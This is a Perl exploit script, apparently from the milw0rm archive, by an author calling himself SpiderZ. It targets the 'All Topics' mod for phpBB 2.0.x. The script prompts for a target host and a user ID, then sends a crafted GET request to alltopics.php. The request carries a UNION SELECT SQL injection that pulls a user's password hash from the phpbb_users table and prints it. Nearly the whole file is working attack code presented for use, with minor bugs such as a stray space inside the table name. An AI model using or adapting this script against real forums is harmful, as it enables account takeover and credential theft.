#!/usr/bin/perl

print q{
_________________________________________________________________________


           /      \
        \  \  ,,  /  /
         '-.`\()/`.-'
        .--_'(  )'_--.
       / /` /`""`\ `\ \           * SpiderZ ForumZ Security *
        |  |  ><  |  |
        \  \      /  /
            '.__.'       


# Author: SpiderZ
# Exploit: All Topics Hack Sql injection
# For: phpBB ( 2.0.x - 2.0.21 )
# Site: www.spiderz.altervista.org
# Site02: www.spiderz.netsons.org
-------------------------------------------------------------------------
Mod download: http://www.phpbbhacks.com/download/2821
-------------------------------------------------------------------------
_________________________________________________________________________

}; 

use IO::Socket;

print q{
=> Insert URL
=> without ( http )
=> };
$server = <STDIN>;
chop ($server);
print q{
=> Insert directory
=> es: /forum/ - /phpBB2/
=> };
$dir = <STDIN>;
chop ($dir);
print q{
=> User ID
=> Number:
=> };
$user = <STDIN>;
chop ($user);
if (!$ARGV[2]) {
}
$myuser = $ARGV[3];
$mypass = $ARGV[4];
$myid = $ARGV[5];
$server =~ s/(http:\/\/)//eg;
$path = $dir;
$path .= "alltopics.php?mode=&order=ASC&start=-1%20UNION%20SELECT%20user_password%20FROM%20phpbb_ users%20where%20user_id=".$user ;
print "
Exploit in process...\r\n";
$socket = IO::Socket::INET->new(
Proto => "tcp",
PeerAddr => "$server",
PeerPort => "80") || die "Exploit failed";
print "Exploit\r\n";
print "in process...\r\n";
print $socket "GET $path HTTP/1.1\r\n";
print $socket "Host: $server\r\n";
print $socket "Accept: */*\r\n";
print $socket "Connection: close\r\n\r\n";
print "Exploit finished!\r\n\r\n";
while ($answer = <$socket>)
{
if ($answer =~/(\w{32})/)
{
if ($1 ne 0) {
print "MD5-Hash is: ".$1."\r\n";
}
exit();
}
}

# milw0rm.com [2006-08-23]
